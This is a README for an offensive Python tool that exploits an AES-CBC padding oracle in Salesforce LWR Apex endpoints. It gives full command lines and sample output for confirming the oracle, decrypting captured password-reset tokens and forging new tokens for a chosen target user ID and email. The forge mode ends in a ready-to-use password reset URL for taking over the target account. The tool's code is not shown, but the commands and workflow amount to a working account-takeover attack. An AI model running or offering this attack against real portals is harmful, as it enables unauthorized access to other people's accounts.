# AES-CBC Padding Oracle Attack

Exploit tool for AES-CBC padding oracle vulnerabilities in Salesforce Lightning Web Runtime (LWR) Apex endpoints. Targets any Apex controller method that accepts an `encryptedParams` parameter via `/s/webruntime/api/apex/execute`.

Supports three operations:
- **Test** — Verify the three oracle states (length error, bad padding, valid decryption)
- **Decrypt** — Recover plaintext from an AES-CBC encrypted token using parallel block decryption
- **Forge** — Create a valid encrypted token with arbitrary content without knowing the key

## Requirements

- Python 3.8+
- No external dependencies (stdlib only)

## Install

```bash
git clone https://github.com/DFC302/AES-CBC-POA.git
cd AES-CBC-POA
```

## Usage

All modes require three target parameters:

| Parameter | Description |
|-----------|-------------|
| `--host` | Target hostname |
| `--classname` | Apex controller class name |
| `--method` | Apex method that accepts `encryptedParams` |

### Test Oracle

Verify the endpoint is vulnerable by confirming three distinct error states:

```bash
python3 aes_cbc_poa.py \
  --host portal.example.com \
  --classname MyController \
  --method myMethod \
  --test
```

```
State 1 (wrong length,  30B): -1  expect -1  [PASS]
State 2 (bad padding,   32B):  0  expect  0  [PASS]
State 3 (16B edge case):       1

[+] Oracle CONFIRMED exploitable.
```

### Decrypt Token

Decrypt a base64-encoded AES-CBC token captured from a password reset URL:

```bash
python3 aes_cbc_poa.py \
  --host portal.example.com \
  --classname MyController \
  --method myMethod \
  --decrypt '<base64_token>' \
  --threads 7
```

Add `--verbose` for per-byte progress output:

```bash
python3 aes_cbc_poa.py \
  --host portal.example.com \
  --classname MyController \
  --method myMethod \
  --decrypt '<base64_token>' \
  --threads 7 \
  --verbose
```

Decrypts all blocks in parallel. Typical token (128 bytes, 7 blocks) takes ~12 minutes with 7 threads and ~15,000 requests.

### Forge Token

Create a new encrypted token containing a target user's Salesforce ID and email:

```bash
python3 aes_cbc_poa.py \
  --host portal.example.com \
  --classname MyController \
  --method myMethod \
  --forge \
  --userid 005XXXXXXXXXYYYYYY \
  --email target@example.com
```

Optionally specify a custom timestamp (default: current time, 24h validity) and parallel guess threads:

```bash
python3 aes_cbc_poa.py \
  --host portal.example.com \
  --classname MyController \
  --method myMethod \
  --forge \
  --userid 005XXXXXXXXXYYYYYY \
  --email target@example.com \
  --timestamp 1772244877815 \
  --forge-threads 32
```

Forgery builds blocks sequentially (last-to-first) but guesses within each byte position in parallel. With 16 forge threads (default), typical forge takes ~5-8 minutes. The forged token is verified against the oracle before output.

After successful forgery, the tool auto-fetches a Salesforce guest session token and outputs a ready-to-use password reset URL:

```
[*] Fetching guest session token...
[+] Token: Af4EoWlHdKaDFqTt6H...

[+] Password Reset URL:
    https://portal.example.com/s/confirmation-link-is-expired?retURL=ForgotPassword%3Fparams%3D...%26token%3D...
```

If auto-fetch fails, provide the token manually with `--token`:

```bash
python3 aes_cbc_poa.py \
  --host portal.example.com \
  --classname MyController \
  --method myMethod \
  --forge \
  --userid 005XXXXXXXXXYYYYYY \
  --email target@example.com \
  --token 'Af4EoWlHdKaDFqTt6H9uo...'
```

Open the output URL in a browser to complete the password reset for the target account.

### All Options

| Flag | Description | Default |
|------|-------------|---------|
| `--test` | Test the three oracle states | — |
| `--decrypt TOKEN` | Decrypt a base64 token | — |
| `--forge` | Forge a new token | — |
| `--host HOST` | Target hostname (required) | — |
| `--classname CLASS` | Apex controller class (required) | — |
| `--method METHOD` | Apex method name (required) | — |
| `--userid ID` | Target Salesforce User ID (forge) | — |
| `--email EMAIL` | Target email address (forge) | — |
| `--timestamp TS` | Epoch milliseconds (forge) | now |
| `--threads N` | Parallel threads for decrypt | 7 |
| `--forge-threads N` | Parallel guess threads for forge | 16 |
| `--token TOKEN` | Salesforce session token for URL | auto-fetch |
| `--verbose` | Show per-byte progress | off |

## How It Works

The Salesforce LWR Apex endpoint returns three distinct error types when processing encrypted input:

1. `SecurityException: "Input length must be multiple of 16"` — ciphertext is wrong length
2. `SecurityException: "Given final block not properly padded"` — AES decryption succeeded but PKCS#7 padding is invalid
3. `JSONException: "No content to map to Object"` — decryption AND unpadding succeeded, plaintext parsed as JSON

The transition from error #2 to error #3 is the padding oracle: it tells the attacker whether a given ciphertext produced valid PKCS#7 padding after decryption.

**Decrypt** exploits this by manipulating the preceding ciphertext block byte-by-byte. For each byte position, up to 256 guesses are tested. When the oracle returns "valid padding" instead of "bad padding," the intermediate decryption value is derived mathematically, and XOR with the original preceding block recovers the plaintext byte.

**Forge** reverses the process: starting from the last block and working backward, the tool discovers intermediate values for each randomly-chosen ciphertext block via parallel guessing, then XORs with the desired plaintext to compute the preceding block. The result is a completely new ciphertext that decrypts to attacker-controlled plaintext.

## References

- Vaudenay, S. (2002). "Security Flaws Induced by CBC Padding"
- Rizzo, J. & Duong, T. (2010). "Practical Padding Oracle Attacks"
